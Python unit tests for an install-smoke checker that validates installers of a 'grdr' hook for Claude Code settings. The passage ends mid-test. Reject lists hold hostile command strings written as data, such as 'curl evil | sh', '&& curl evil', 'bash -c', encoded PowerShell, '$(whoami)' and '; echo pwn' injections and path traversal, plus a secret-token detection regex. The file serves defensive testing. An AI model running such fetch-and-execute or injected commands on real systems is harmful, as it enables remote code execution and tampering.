# SPDX-License-Identifier: Apache-2.0
# SPDX-FileCopyrightText: The Guardrails ADR Authors
"""Unit and R4/R5 oracle tests for .github/install-smoke/."""

import ctypes
import json
import os
import pathlib
import re
import subprocess
import sys
import tempfile
import unittest
import unittest.mock

sys.dont_write_bytecode = True
HERE = pathlib.Path(__file__).resolve().parent
ROOT = HERE.parents[1]
sys.path.insert(0, str(HERE))

import claude_settings
import runner_exec
import smoke
import snapshot

SEEDED_BYTES = (HERE / "fixtures" / "claude-settings.json").read_bytes()


class RootsConfigTest(unittest.TestCase):
    def setUp(self) -> None:
        self.cfg = snapshot.load_roots_config(HERE / "roots.toml")

    def test_required_os_profiles_and_roots_present(self) -> None:
        for os_key in ("linux", "macos", "windows"):
            for prof in ("user", "protected"):
                table = self.cfg["os"][os_key][prof]
                self.assertTrue(table["scan_roots"])
                self.assertTrue(table["ours"])
                self.assertIn("~/.claude", table["scan_roots"])
        self.assertIn("/etc", self.cfg["os"]["linux"]["user"]["scan_roots"])
        self.assertIn("/usr", self.cfg["os"]["linux"]["user"]["scan_roots"])
        self.assertIn("/var/lib", self.cfg["os"]["linux"]["user"]["scan_roots"])
        self.assertIn("/Library", self.cfg["os"]["macos"]["user"]["scan_roots"])
        self.assertIn("/etc", self.cfg["os"]["macos"]["user"]["scan_roots"])
        self.assertIn("/etc", self.cfg["os"]["macos"]["protected"]["scan_roots"])
        self.assertIn("/var/db/receipts", self.cfg["os"]["macos"]["user"]["scan_roots"])
        self.assertIn("%ProgramFiles%", self.cfg["os"]["windows"]["user"]["scan_roots"])
        self.assertIn("%ProgramData%", self.cfg["os"]["windows"]["user"]["scan_roots"])
        self.assertIn("%LOCALAPPDATA%", self.cfg["os"]["windows"]["user"]["scan_roots"])
        self.assertEqual(self.cfg["os"]["windows"]["windows_registry"], ["HKCU\\Software", "HKLM\\SOFTWARE"])
        self.assertTrue(self.cfg["os"]["windows"]["windows_tasks"])
        self.assertTrue(self.cfg["os"]["windows"]["windows_services"])

    def test_symlinked_top_level_scan_root_walks_children_only(self) -> None:
        host_os = snapshot.detect_host_os()
        with tempfile.TemporaryDirectory() as tmp:
            base = pathlib.Path(tmp)
            private_etc = base / "private_etc"
            (private_etc / "sub").mkdir(parents=True)
            (private_etc / "sub" / "hosts.conf").write_text("127.0.0.1 localhost\n", encoding="utf-8")

            outside = base / "outside"
            outside.mkdir()
            (outside / "secret.txt").write_text("do-not-traverse\n", encoding="utf-8")
            _make_dir_link(private_etc / "escape", outside)

            etc_link = base / "etc"
            _make_dir_link(etc_link, private_etc)

            private_var = base / "private_var"
            (private_var / "db").mkdir(parents=True)
            (private_var / "db" / "state.txt").write_text("ok\n", encoding="utf-8")
            var_link = base / "var"
            _make_dir_link(var_link, private_var)

            entries = snapshot.capture_snapshot(
                self.cfg,
                host_os,
                snapshot.Profile.USER,
                override_roots=[str(etc_link), str(var_link)],
            )
            norm_keys = {snapshot.normalize_for_match(k, host_os): v for k, v in entries.items()}
            self.assertEqual(norm_keys[snapshot.normalize_for_match(str(etc_link), host_os)].kind, snapshot.EntryKind.SYMLINK)
            self.assertEqual(
                norm_keys[snapshot.normalize_for_match(str(etc_link / "sub" / "hosts.conf"), host_os)].kind,
                snapshot.EntryKind.FILE,
            )
            self.assertEqual(
                norm_keys[snapshot.normalize_for_match(str(etc_link / "escape"), host_os)].kind,
                snapshot.EntryKind.SYMLINK,
            )
            self.assertNotIn(
                snapshot.normalize_for_match(str(etc_link / "escape" / "secret.txt"), host_os),
                norm_keys,
            )
            self.assertEqual(
                norm_keys[snapshot.normalize_for_match(str(var_link / "db" / "state.txt"), host_os)].kind,
                snapshot.EntryKind.FILE,
            )

            mac_entries = snapshot.capture_snapshot(
                self.cfg,
                snapshot.OsName.MACOS,
                snapshot.Profile.USER,
                override_roots=[str(etc_link), str(var_link)],
            )
            mac_keys = {snapshot.normalize_for_match(k, snapshot.OsName.MACOS) for k in mac_entries}
            self.assertIn(snapshot.normalize_for_match(str(etc_link / "sub" / "hosts.conf"), snapshot.OsName.MACOS), mac_keys)
            self.assertIn(snapshot.normalize_for_match(str(var_link / "db" / "state.txt"), snapshot.OsName.MACOS), mac_keys)

    def test_ours_path_boundary_enforcement(self) -> None:
        env = {"HOME": "/home/alice", "USERPROFILE": "C:\\Users\\alice", "LOCALAPPDATA": "C:\\Users\\alice\\AppData\\Local"}
        linux_ours = snapshot.ours_patterns(self.cfg, snapshot.OsName.LINUX, snapshot.Profile.USER, env)
        self.assertTrue(snapshot.is_under_ours("/home/alice/.local/share/grdr/bin/grdr-hook", linux_ours, snapshot.OsName.LINUX))
        self.assertFalse(snapshot.is_under_ours("/home/alice/.local/share/grdr-evil/bin/grdr-hook", linux_ours, snapshot.OsName.LINUX))
        self.assertFalse(snapshot.is_under_ours("/home/alice/.config/other-file", linux_ours, snapshot.OsName.LINUX))

        win_ours = snapshot.ours_patterns(self.cfg, snapshot.OsName.WINDOWS, snapshot.Profile.USER, env)
        self.assertTrue(snapshot.is_under_ours("reg://HKCU/Software/grdr::version", win_ours, snapshot.OsName.WINDOWS))
        self.assertFalse(snapshot.is_under_ours("reg://HKCU/Software/grdr-evil::version", win_ours, snapshot.OsName.WINDOWS))
        self.assertTrue(snapshot.is_under_ours("task://\\grdr-daemon", win_ours, snapshot.OsName.WINDOWS))
        self.assertFalse(snapshot.is_under_ours("task://\\other\\grdr-daemon", win_ours, snapshot.OsName.WINDOWS))

    def test_wildcard_ignore_paths_match_dir_and_descendants_only(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            app_support = pathlib.Path(tmp) / "Library" / "Application Support"
            apple_dir = app_support / "com.apple.wallpaper" / "Store"
            apple_dir.mkdir(parents=True)
            (apple_dir / "Index.plist").write_text("apple\n", encoding="utf-8")
            grdr_dir = app_support / "grdr" / "bin"
            grdr_dir.mkdir(parents=True)
            (grdr_dir / "grdr").write_text("bin\n", encoding="utf-8")

            host_os = snapshot.detect_host_os()
            cfg = {
                **self.cfg,
                "os": {
                    **self.cfg["os"],
                    host_os.value: {
                        **self.cfg["os"][host_os.value],
                        "ignore_paths": [str(app_support / "com.apple.*")],
                    },
                },
            }
            entries = snapshot.capture_snapshot(
                cfg,
                host_os,
                snapshot.Profile.USER,
                override_roots=[str(app_support)],
            )
            norm_keys = {snapshot.normalize_for_match(k, host_os) for k in entries}
            self.assertIn(snapshot.normalize_for_match(str(grdr_dir / "grdr"), host_os), norm_keys)
            self.assertNotIn(snapshot.normalize_for_match(str(app_support / "com.apple.wallpaper"), host_os), norm_keys)
            self.assertNotIn(snapshot.normalize_for_match(str(apple_dir / "Index.plist"), host_os), norm_keys)

    def test_windows_non_symlink_reparse_point_records_unreadable(self) -> None:
        fake_stat = unittest.mock.Mock(
            st_mode=0o100666,
            st_file_attributes=snapshot.WINDOWS_REPARSE_ATTR,
        )
        with (
            unittest.mock.patch.object(snapshot.os, "readlink", side_effect=ValueError("not a symbolic link")),
            unittest.mock.patch.object(snapshot, "_windows_owner_sid", return_value="S-1-5-18"),
        ):
            entry = snapshot._entry_metadata(
                "C:\\Users\\alice\\AppData\\Local\\Microsoft\\WindowsApps\\python3.exe",
                fake_stat,
                snapshot.OsName.WINDOWS,
                65536,
            )
        self.assertEqual(entry.kind, snapshot.EntryKind.SYMLINK)
        self.assertEqual(entry.sha256, "symlink:<unreadable>")

    def test_stat_cache_reuses_unchanged_entries_and_invalidates_on_change(self) -> None:
        host_os = snapshot.detect_host_os()
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp) / "scan_root"
            root.mkdir()
            target = root / "sample.bin"
            target.write_bytes(b"alpha")
            cfg = {
                **self.cfg,
                "os": {
                    **self.cfg["os"],
                    host_os.value: {**self.cfg["os"][host_os.value], "ignore_paths": []},
                },
            }
            cache: dict[str, tuple[tuple[object, ...], snapshot.SnapshotEntry]] = {}
            orig_sha = snapshot._sha256_file
            with unittest.mock.patch.object(snapshot, "_sha256_file", wraps=orig_sha) as sha_mock:
                first = snapshot.capture_snapshot(cfg, host_os, snapshot.Profile.USER, override_roots=[str(root)], stat_cache=cache)
                self.assertEqual(sha_mock.call_count, 1)
                second = snapshot.capture_snapshot(cfg, host_os, snapshot.Profile.USER, override_roots=[str(root)], stat_cache=cache)
                self.assertEqual(sha_mock.call_count, 1)
                self.assertEqual(first[str(target)], second[str(target)])

                target.write_bytes(b"beta-longer")
                third = snapshot.capture_snapshot(cfg, host_os, snapshot.Profile.USER, override_roots=[str(root)], stat_cache=cache)
                self.assertEqual(sha_mock.call_count, 2)
                self.assertNotEqual(first[str(target)].sha256, third[str(target)].sha256)


class PlannerTest(unittest.TestCase):
    def setUp(self) -> None:
        self.cfg = snapshot.load_roots_config(HERE / "roots.toml")

    def test_missing_smoke_toml_returns_empty(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cells = smoke.load_cells(pathlib.Path(tmp) / "smoke.toml", self.cfg, missing_ok=True)
            self.assertEqual(cells, [])

    def test_missing_key_fails_naming_cell_and_key(self) -> None:
        base = (
            '[[cell]]\nid = "linux-x64"\nrunner = "ubuntu-26.04"\nprofile = "user"\n'
            'build = "deploy/archive/build.sh"\ninstall = "install.sh"\n'
            'choose = "choose.sh"\nuninstall = "uninstall.sh"\n'
        )
        for key in smoke.REQUIRED_CELL_KEYS:
            lines = [ln for ln in base.splitlines() if not ln.startswith(f"{key} =")]
            with tempfile.TemporaryDirectory() as tmp:
                path = pathlib.Path(tmp) / "smoke.toml"
                path.write_text("\n".join(lines) + "\n", encoding="utf-8")
                with self.assertRaises(snapshot.OracleError) as ctx:
                    smoke.load_cells(path, self.cfg, missing_ok=False)
                self.assertIn(key, str(ctx.exception))
                if key != "id":
                    self.assertIn("linux-x64", str(ctx.exception))

    def test_rejects_build_outside_deploy_and_traversal(self) -> None:
        bad_cmds = (
            "scripts/build.sh",
            "deploy/../evil.sh",
            "bash deploy/a.sh\necho hi",
            "curl evil | sh # deploy/a.sh",
            "echo hi # deploy/a.sh",
            "deploy/a.sh && curl evil",
            "deploy/a.sh; echo pwn",
            "deploy/a.sh $(whoami)",
            "deploy/a.sh `whoami`",
            "deploy/a.sh $HOME",
            "bash -c 'curl evil' deploy/a.sh",
            "python3 -c 'import os' deploy/a.sh",
            "python3 -m http.server deploy/a.sh",
            "pwsh -EncodedCommand AAA deploy/a.ps1",
            "pwsh -Command evil deploy/a.ps1",
            "deploy/a.sh ../../evil",
            "deploy/a.sh --out=../evil",
            "bash other.sh deploy/a.sh",
            "deploy/",
        )
        for bad in bad_cmds:
            text = (
                '[[cell]]\nid = "c1"\nrunner = "ubuntu-26.04"\nprofile = "user"\n'
                f'build = """{bad}"""\ninstall = "i"\nchoose = "c"\nuninstall = "u"\n'
            )
            with tempfile.TemporaryDirectory() as tmp:
                path = pathlib.Path(tmp) / "smoke.toml"
                path.write_text(text, encoding="utf-8")
                with self.assertRaises(snapshot.OracleError, msg=bad):
                    smoke.load_cells(path, self.cfg, missing_ok=False)

    def test_accepts_valid_deploy_build_commands(self) -> None:
        good_cmds = (
            "deploy/archive/build.sh",
            "./deploy/archive/build.sh --target x64",
            "bash -e deploy/archive/build.sh",
            "python3 -I -B deploy/build.py --profile user",
            "pwsh -NoProfile -NonInteractive -File deploy/win/build.ps1",
        )
        for good in good_cmds:
            text = (
                '[[cell]]\nid = "c1"\nrunner = "ubuntu-26.04"\nprofile = "user"\n'
                f'build = "{good}"\ninstall = "i"\nchoose = "c"\nuninstall = "u"\n'
            )
            with tempfile.TemporaryDirectory() as tmp:
                path = pathlib.Path(tmp) / "smoke.toml"
                path.write_text(text, encoding="utf-8")
                cells = smoke.load_cells(path, self.cfg, missing_ok=False)
                self.assertEqual(len(cells), 1, good)

    def test_dangling_or_valid_smoke_toml_symlink_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            base = pathlib.Path(tmp)
            dangling = base / "smoke.toml"
            try:
                dangling.symlink_to(base / "missing.toml")
            except OSError:
                target_dir = base / "dir_target"
                target_dir.mkdir()
                _make_dir_link(dangling, target_dir)
                target_dir.rmdir()
            with self.assertRaises(snapshot.OracleError):
                smoke.load_cells(dangling, self.cfg, missing_ok=True)

    def test_unit_lint_missing_tool_never_skips(self) -> None:
        with unittest.mock.patch.object(smoke.shutil, "which", return_value=None):
            ns = smoke.argparse.Namespace(roots=HERE / "roots.toml", os="linux", github_output=None)
            with self.assertRaises(snapshot.OracleError) as ctx:
                smoke.cmd_unit_lint(ns)
            self.assertIn("systemd-analyze", str(ctx.exception))


class ClaudeSettingsTest(unittest.TestCase):
    def setUp(self) -> None:
        self.patterns = ["/home/alice/.local/share/grdr"]
        self.seeded = SEEDED_BYTES

    def test_preserving_append_and_new_event_pass(self) -> None:
        text = self.seeded.decode("utf-8")
        entry = (
            '      {\n'
            '        "matcher": "*",\n'
            '        "hooks": [\n'
            '          {\n'
            '            "type": "command",\n'
            '            "command": "/home/alice/.local/share/grdr/bin/grdr-hook --agent claude-code --event PreToolUse",\n'
            '            "timeout": 5\n'
            '          }\n'
            '        ]\n'
            '      }'
        )
        updated = text.replace("      }\n    ]", f"      }},\n{entry}\n    ]", 1)
        updated = updated.replace(
            "\n  },\n",
            ',\n    "PermissionRequest": [\n' + entry.replace("PreToolUse", "PermissionRequest") + "\n    ]\n  },\n",
            1,
        )
        count, errs = claude_settings.verify_user_claude_settings(
            self.seeded, updated.encode("utf-8"), self.patterns, snapshot.OsName.LINUX
        )
        self.assertEqual(errs, [])
        self.assertEqual(count, 2)

    def test_two_leading_ours_entries_pass(self) -> None:
        text = self.seeded.decode("utf-8")
        e1 = '      {"matcher": "*", "hooks": [{"type": "command", "command": "/home/alice/.local/share/grdr/bin/grdr-hook --a"}]}'
        e2 = '      {"matcher": "*", "hooks": [{"type": "command", "command": "/home/alice/.local/share/grdr/bin/grdr-hook --b"}]}'
        updated = text.replace('"PreToolUse": [\n', f'"PreToolUse": [\n{e1},\n{e2},\n', 1)
        count, errs = claude_settings.verify_user_claude_settings(
            self.seeded, updated.encode("utf-8"), self.patterns, snapshot.OsName.LINUX
        )
        self.assertEqual(errs, [])
        self.assertEqual(count, 2)

    def test_single_byte_vendor_mutation_rejected(self) -> None:
        text = self.seeded.decode("utf-8").replace('"timeout": 10', '"timeout": 11', 1)
        e1 = '      {"matcher": "*", "hooks": [{"type": "command", "command": "/home/alice/.local/share/grdr/bin/grdr-hook"}]}'
        updated = text.replace("      }\n    ]", f"      }},\n{e1}\n    ]", 1)
        _, errs = claude_settings.verify_user_claude_settings(
            self.seeded, updated.encode("utf-8"), self.patterns, snapshot.OsName.LINUX
        )
        self.assertNotEqual(errs, [])

    def test_command_outside_ours_or_shell_meta_rejected(self) -> None:
        text = self.seeded.decode("utf-8")
        for bad_cmd in (
            "/tmp/evil-hook",
            "grdr-hook --relative",
            "/home/alice/.local/share/grdr/../evil",
            "/home/alice/.local/share/grdr/bin/grdr-hook; echo pwn",
        ):
            e1 = f'      {{"matcher": "*", "hooks": [{{"type": "command", "command": "{bad_cmd}"}}]}}'
            updated = text.replace("      }\n    ]", f"      }},\n{e1}\n    ]", 1)
            _, errs = claude_settings.verify_user_claude_settings(
                self.seeded, updated.encode("utf-8"), self.patterns, snapshot.OsName.LINUX
            )
            self.assertNotEqual(errs, [], bad_cmd)

    def test_diff_never_prints_file_contents(self) -> None:
        marker = "UNIQUE_CONTENT_MARKER_DO_NOT_PRINT"
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp) / "cfg"
            root.mkdir()
            target = root / "secret.json"
            target.write_text(marker, encoding="utf-8")
            cfg = snapshot.load_roots_config(HERE / "roots.toml")
            s0 = snapshot.capture_snapshot(cfg, snapshot.detect_host_os(), snapshot.Profile.USER, override_roots=[str(root)])
            target.write_text(marker + "_CHANGED", encoding="utf-8")
            s1 = snapshot.capture_snapshot(cfg, snapshot.detect_host_os(), snapshot.Profile.USER, override_roots=[str(root)])
            lines = "\n".join(snapshot.format_diff(snapshot.diff_snapshots(s0, s1)))
        self.assertNotIn(marker, lines)
        self.assertIn(str(target), lines)

    def test_protected_dropin_passes_with_untouched_user_settings(self) -> None:
        cfg = snapshot.load_roots_config(HERE / "roots.toml")
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            home = root / "home"
            dropin_dir = root / "etc" / "claude-code" / "managed-settings.d"
            user_file = home / ".claude" / "settings.json"
            user_file.parent.mkdir(parents=True)
            user_file.write_bytes(self.seeded)

            fake_cfg = {
                **cfg,
                "os": {
                    **cfg["os"],
                    "linux": {
                        **cfg["os"]["linux"],
                        "claude_dropin_dir": str(dropin_dir).replace("\\", "/"),
                    },
                },
            }
            env = {"HOME": str(home).replace("\\", "/")}
            s1 = {
                user_file.as_posix(): snapshot.SnapshotEntry(
                    user_file.as_posix(), snapshot.EntryKind.FILE, "0600", "1000:1000", snapshot.sha256_bytes(self.seeded)
                )
            }
            dropin_dir.mkdir(parents=True)
            dropin_file = dropin_dir / "50-grdr.json"
            dropin_bytes = (
                b'{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command",'
                b'"command":"/usr/libexec/grdr/grdr-hook --agent claude-code --event PreToolUse"}]}]}}'
            )
            dropin_file.write_bytes(dropin_bytes)
            s_choose = {
                **s1,
                dropin_dir.as_posix(): snapshot.SnapshotEntry(dropin_dir.as_posix(), snapshot.EntryKind.DIR, "0755", "0:0", ""),
                dropin_file.as_posix(): snapshot.SnapshotEntry(
                    dropin_file.as_posix(), snapshot.EntryKind.FILE, "0644", "0:0", snapshot.sha256_bytes(dropin_bytes)
                ),
            }
            errs = claude_settings.verify_choose_changes(
                s1, s_choose, fake_cfg, snapshot.OsName.LINUX, snapshot.Profile.PROTECTED, self.seeded, env
            )
            self.assertEqual(errs, [])

    def test_rejects_duplicate_keys_and_non_rfc8259_constants(self) -> None:
        ours_cmd = "/home/alice/.local/share/grdr/bin/grdr-hook"
        evil_cmd = "/tmp/evil-hook"
        text = self.seeded.decode("utf-8")
        dup_top = text.rstrip()[:-1] + f', "hooks": {{"PreToolUse": [{{"matcher": "*", "hooks": [{{"type": "command", "command": "{ours_cmd}"}}]}}]}}}}\n'
        _, errs = claude_settings.verify_user_claude_settings(
            self.seeded, dup_top.encode("utf-8"), self.patterns, snapshot.OsName.LINUX
        )
        self.assertNotEqual(errs, [])

        dup_nested = text.replace(
            '"timeout": 10',
            f'"timeout": 10, "extra": {{"a": 1, "a": 2}}',
            1,
        )
        _, errs = claude_settings.verify_user_claude_settings(
            self.seeded, dup_nested.encode("utf-8"), self.patterns, snapshot.OsName.LINUX
        )
        self.assertNotEqual(errs, [])

        dup_event = text.replace(
            '"PreToolUse": [',
            f'"PreToolUse": [{{"matcher": "*", "hooks": [{{"type": "command", "command": "{ours_cmd}"}}]}}], "PreToolUse": [',
            1,
        )
        _, errs = claude_settings.verify_user_claude_settings(
            self.seeded, dup_event.encode("utf-8"), self.patterns, snapshot.OsName.LINUX
        )
        self.assertNotEqual(errs, [])

        for const in ("NaN", "Infinity", "-Infinity"):
            bad_const = text.replace(
                "      }\n    ]",
                f'      }},\n      {{"matcher": "*", "timeout": {const}, "hooks": [{{"type": "command", "command": "{ours_cmd}"}}]}}\n    ]',
                1,
            )
            _, errs = claude_settings.verify_user_claude_settings(
                self.seeded, bad_const.encode("utf-8"), self.patterns, snapshot.OsName.LINUX
            )
            self.assertNotEqual(errs, [], const)

            dropin_const = (
                f'{{"hooks":{{"PreToolUse":[{{"matcher":"*","timeout":{const},'
                f'"hooks":[{{"type":"command","command":"/usr/libexec/grdr/grdr-hook"}}]}}]}}}}'
            ).encode("utf-8")
            _, d_errs = claude_settings.verify_dropin_claude_settings(
                dropin_const, ["/usr/libexec/grdr"], snapshot.OsName.LINUX
            )
            self.assertNotEqual(d_errs, [], const)

        dup_dropin = (
            f'{{"hooks":{{"PreToolUse":[{{"matcher":"*","hooks":[{{"type":"command","command":"/usr/libexec/grdr/grdr-hook"}}]}}]}},'
            f'"hooks":{{"PreToolUse":[{{"matcher":"*","hooks":[{{"type":"command","command":"{evil_cmd}"}}]}}]}}}}'
        ).encode("utf-8")
        _, d_errs = claude_settings.verify_dropin_claude_settings(
            dup_dropin, ["/usr/libexec/grdr"], snapshot.OsName.LINUX
        )
        self.assertNotEqual(d_errs, [])

    def _protected_fixture(
        self, root: pathlib.Path, *, mutate_user: bool = False
    ) -> tuple[dict[str, object], dict[str, str], pathlib.Path, pathlib.Path, dict[str, snapshot.SnapshotEntry]]:
        cfg = snapshot.load_roots_config(HERE / "roots.toml")
        home = root / "home"
        dropin_dir = root / "etc" / "claude-code" / "managed-settings.d"
        user_file = home / ".claude" / "settings.json"
        user_file.parent.mkdir(parents=True, exist_ok=True)
        user_bytes = self.seeded
        if mutate_user:
            e1 = '      {"matcher": "*", "hooks": [{"type": "command", "command": "/opt/grdr/bin/grdr-hook"}]}'
            user_bytes = self.seeded.decode("utf-8").replace("      }\n    ]", f"      }},\n{e1}\n    ]", 1).encode("utf-8")
        user_file.write_bytes(user_bytes)
        fake_cfg = {
            **cfg,
            "os": {
                **cfg["os"],
                "linux": {**cfg["os"]["linux"], "claude_dropin_dir": str(dropin_dir).replace("\\", "/")},
            },
        }
        env = {"HOME": str(home).replace("\\", "/")}
        s1 = {
            user_file.as_posix(): snapshot.SnapshotEntry(
                user_file.as_posix(), snapshot.EntryKind.FILE, "0600", "1000:1000", snapshot.sha256_bytes(self.seeded)
            )
        }
        return fake_cfg, env, user_file, dropin_dir, s1

    def test_protected_rejects_user_plus_evil_dropin_and_non_regular_entries(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            fake_cfg, env, user_file, dropin_dir, s1 = self._protected_fixture(root, mutate_user=True)
            dropin_dir.mkdir(parents=True)
            evil_dropin = dropin_dir / "99-evil.json"
            evil_bytes = b'{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"/tmp/evil"}]}]}}'
            evil_dropin.write_bytes(evil_bytes)
            s_choose = {
                user_file.as_posix(): snapshot.SnapshotEntry(
                    user_file.as_posix(),
                    snapshot.EntryKind.FILE,
                    "0600",
                    "1000:1000",
                    snapshot.sha256_bytes(user_file.read_bytes()),
                ),
                dropin_dir.as_posix(): snapshot.SnapshotEntry(dropin_dir.as_posix(), snapshot.EntryKind.DIR, "0755", "0:0", ""),
                evil_dropin.as_posix(): snapshot.SnapshotEntry(
                    evil_dropin.as_posix(), snapshot.EntryKind.FILE, "0644", "0:0", snapshot.sha256_bytes(evil_bytes)
                ),
            }
            errs = claude_settings.verify_choose_changes(
                s1, s_choose, fake_cfg, snapshot.OsName.LINUX, snapshot.Profile.PROTECTED, self.seeded, env
            )
            self.assertNotEqual(errs, [])

        for bad_name, bad_kind in (
            ("50-grdr.json", snapshot.EntryKind.SYMLINK),
            ("50-grdr.json", snapshot.EntryKind.DIR),
            ("evil.txt", snapshot.EntryKind.SYMLINK),
            ("evil.txt", snapshot.EntryKind.FILE),
            ("sub/50-grdr.json", snapshot.EntryKind.FILE),
        ):
            with tempfile.TemporaryDirectory() as tmp:
                root = pathlib.Path(tmp)
                fake_cfg, env, user_file, dropin_dir, s1 = self._protected_fixture(root)
                dropin_dir.mkdir(parents=True)
                bad_dropin = dropin_dir / bad_name
                s_choose = {
                    **s1,
                    dropin_dir.as_posix(): snapshot.SnapshotEntry(dropin_dir.as_posix(), snapshot.EntryKind.DIR, "0755", "0:0", ""),
                    bad_dropin.as_posix(): snapshot.SnapshotEntry(bad_dropin.as_posix(), bad_kind, "0777", "0:0", "deadbeef"),
                }
                errs = claude_settings.verify_choose_changes(
                    s1, s_choose, fake_cfg, snapshot.OsName.LINUX, snapshot.Profile.PROTECTED, self.seeded, env
                )
                self.assertNotEqual(errs, [], (bad_name, bad_kind))

                if bad_name == "50-grdr.json":
                    s_bad_user = {
                        user_file.as_posix(): snapshot.SnapshotEntry(user_file.as_posix(), bad_kind, "0777", "0:0", "deadbeef")
                    }
                    errs = claude_settings.verify_choose_changes(
                        s1, s_bad_user, fake_cfg, snapshot.OsName.LINUX, snapshot.Profile.USER, self.seeded, env
                    )
                    self.assertNotEqual(errs, [], bad_kind)

    def test_protected_valid_user_and_dropin_both_validated_pass(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            fake_cfg, env, user_file, dropin_dir, s1 = self._protected_fixture(root, mutate_user=True)
            dropin_dir.mkdir(parents=True)
            dropin_file = dropin_dir / "50-grdr.json"
            dropin_bytes = (
                b'{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command",'
                b'"command":"/usr/libexec/grdr/grdr-hook --agent claude-code"}]}]}}'
            )
            dropin_file.write_bytes(dropin_bytes)
            s_choose = {
                user_file.as_posix(): snapshot.SnapshotEntry(
                    user_file.as_posix(),
                    snapshot.EntryKind.FILE,
                    "0600",
                    "1000:1000",
                    snapshot.sha256_bytes(user_file.read_bytes()),
                ),
                dropin_dir.as_posix(): snapshot.SnapshotEntry(dropin_dir.as_posix(), snapshot.EntryKind.DIR, "0755", "0:0", ""),
                dropin_file.as_posix(): snapshot.SnapshotEntry(
                    dropin_file.as_posix(), snapshot.EntryKind.FILE, "0644", "0:0", snapshot.sha256_bytes(dropin_bytes)
                ),
            }
            errs = claude_settings.verify_choose_changes(
                s1, s_choose, fake_cfg, snapshot.OsName.LINUX, snapshot.Profile.PROTECTED, self.seeded, env
            )
            self.assertEqual(errs, [])

        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            fake_cfg, env, user_file, dropin_dir, s1 = self._protected_fixture(root, mutate_user=True)
            dropin_dir.mkdir(parents=True)
            s_empty_dir = {
                user_file.as_posix(): snapshot.SnapshotEntry(
                    user_file.as_posix(),
                    snapshot.EntryKind.FILE,
                    "0600",
                    "1000:1000",
                    snapshot.sha256_bytes(user_file.read_bytes()),
                ),
                dropin_dir.as_posix(): snapshot.SnapshotEntry(dropin_dir.as_posix(), snapshot.EntryKind.DIR, "0755", "0:0", ""),
            }
            errs = claude_settings.verify_choose_changes(
                s1, s_empty_dir, fake_cfg, snapshot.OsName.LINUX, snapshot.Profile.PROTECTED, self.seeded, env
            )
            self.assertNotEqual(errs, [])


class R4AndR5LocalTest(unittest.TestCase):
    def setUp(self) -> None:
        self.cfg = snapshot.load_roots_config(HERE / "roots.toml")
        self.os_name = snapshot.detect_host_os()
        self.runner = next(r for r, o in self.cfg["runners"].items() if o == self.os_name.value)

    def _run_fixture(self, cell_id: str) -> smoke.CellOutcome:
        cmd = f"python3 -I -B .github/install-smoke/fixtures/fixture_cell.py {cell_id}"
        cell = smoke.CellSpec(
            id=cell_id,
            runner=self.runner,
            profile=snapshot.Profile.USER,
            build=f"{cmd} build",
            install=f"{cmd} install",
            choose=f"{cmd} choose",
            uninstall=f"{cmd} uninstall",
        )
        orig_run = smoke.run_step_command

        def local_run(command, os_name, profile, env, cwd, timeout_seconds, *, elevated=False):
            if elevated and ((os.name == "nt" and not runner_exec.is_windows_elevated()) or (os.name != "nt" and os.geteuid() != 0)):
                return runner_exec.CommandResult(1, "", "simulated elevated refusal")
            return orig_run(command, os_name, profile, env, cwd, timeout_seconds, elevated=elevated)

        with tempfile.TemporaryDirectory() as tmp:
            home = pathlib.Path(tmp) / "home"
            home.mkdir()
            env = smoke.isolated_env(home, os.environ)
            user_roots = [
                snapshot.expand_path("~/.claude", self.os_name, env),
                snapshot.expand_path("~/.config", self.os_name, env),
                snapshot.expand_path("~/.local/share", self.os_name, env),
                snapshot.expand_path("~/.local/state", self.os_name, env),
                snapshot.expand_path("~/.local/bin", self.os_name, env),
            ]
            if self.os_name == snapshot.OsName.WINDOWS:
                user_roots.append(snapshot.expand_path("%LOCALAPPDATA%", self.os_name, env))

            def fast_capture(cfg, os_n, prof, run_env=None, override_roots=None):
                return snapshot.capture_snapshot(cfg, os_n, prof, run_env, override_roots=user_roots)

            with (
                unittest.mock.patch.object(smoke, "capture_snapshot", fast_capture),
                unittest.mock.patch.object(smoke, "run_step_command", local_run),
            ):
                return smoke.run_r4_cell(cell, self.cfg, ROOT, env)

    def test_clean_fixture_passes_all_steps(self) -> None:
        outcome = self._run_fixture("clean")
        self.assertIsInstance(outcome, smoke.CellPassed, outcome.step_log)

    def test_seeded_fixture_cells_fail_at_expected_steps(self) -> None:
        expected = {
            "writes-outside-ours": smoke.StepName.INSTALL,
            "leaves-file-behind": smoke.StepName.UNINSTALL,
            "mutates-vendor-hook": smoke.StepName.CHOOSE,
        }
        cells = smoke.load_cells(HERE / "fixtures" / "cells.toml", self.cfg, missing_ok=False, allow_fixture_prefix=True)
        self.assertEqual({c.id for c in cells}, set(expected))
        for cell_id, step in expected.items():
            with self.subTest(cell=cell_id):
                outcome = self._run_fixture(cell_id)
                if not isinstance(outcome, smoke.CellFailed):
                    self.fail(f"{cell_id}: expected CellFailed, got {outcome}")
                self.assertEqual(outcome.failed_step, step, outcome.step_log)

    def test_fixtures_contain_no_token_shaped_strings(self) -> None:
        token_re = re.compile(
            r"(?:gh[pousr]_[A-Za-z0-9]{16,}|sk-[A-Za-z0-9-]{16,}|xox[baprs]-[A-Za-z0-9-]+|AKIA[0-9A-Z]{16}|BEGIN [A-Z ]+ KEY)"
        )
        for path in sorted((HERE / "fixtures").rglob("*")):
            if path.is_file() and "__pycache__" not in path.parts and path.suffix != ".pyc":
                text = path.read_text(encoding="utf-8")
                self.assertIsNone(token_re.search(text), f"token-shaped string in {path}")

    def test_run_r4_cell_propagates_elevated_for_protected_profile(self) -> None:
        recorded: list[tuple[str, bool]] = []
        with tempfile.TemporaryDirectory() as tmp:
            base = pathlib.Path(tmp)
            home = base / "home"
            ours_dir = base / "ours"
